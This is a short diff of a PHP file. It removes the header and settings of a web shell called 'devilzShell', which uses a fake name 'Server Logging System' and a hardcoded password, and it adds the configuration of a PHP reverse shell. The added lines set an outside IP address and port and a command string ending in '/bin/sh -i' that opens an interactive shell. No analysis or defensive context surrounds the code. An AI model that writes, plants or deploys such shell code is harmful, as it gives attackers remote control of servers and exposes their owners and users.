@@ -1,35 +1,15 @@
 <?php
-//
-// devilzShell <[php]>
-// ^^^^^^^^^^^^
-// author: b374k
-// greets: devilzc0der(s) and all of you who love peace and freedom
-//
-//
-// ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-// Jayalah Indonesiaku
 
-
-//################ VARIABLES GOES HERE #######################=============================================]
-$shell_name = "devilzShell";
-$shell_fake_name = "Server Logging System";
-$shell_title = " :: ".$shell_name." ::";
-$shell_version = "v1";
-$shell_password = "yasu123";
-$shell_fav_port = "12345";
-$shell_color = "#374374";
-
-// server software
-$xSoftware = trim(getenv("SERVER_SOFTWARE"));
-// uname -a
-$xSystem = trim(php_uname());
-// server ip
-$xServerIP = $_SERVER["SERVER_ADDR"];
-// your ip ;-)
-$xClientIP = $_SERVER['REMOTE_ADDR'];
-
-$xHeader = $xSoftware."<br />".$xSystem."<br />Server IP: <span class=\"gaul\">[ </span>".$xServerIP."<span class=\"gaul\"> ]</span>&nbsp;&nbsp;&nbsp;Your IP: <span class=\"gaul\">[ </span>".$xClientIP."<span class=\"gaul\"> ]</span>";
-
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '159.89.214.31';  // CHANGE THIS
+$port = 2244;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
 //################# RESOURCES GOES HERE #######################=============================================]
 $icon = "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB/klEQVR42o2RS2gUQRCGq7rHB0rw
 4miwFWVmPSmIHpaQSwQD4ivGKHsImIOyBhJETUDjRaMIEjTk4gNFIutBwScY8eBh9aBgyCGCiKu4
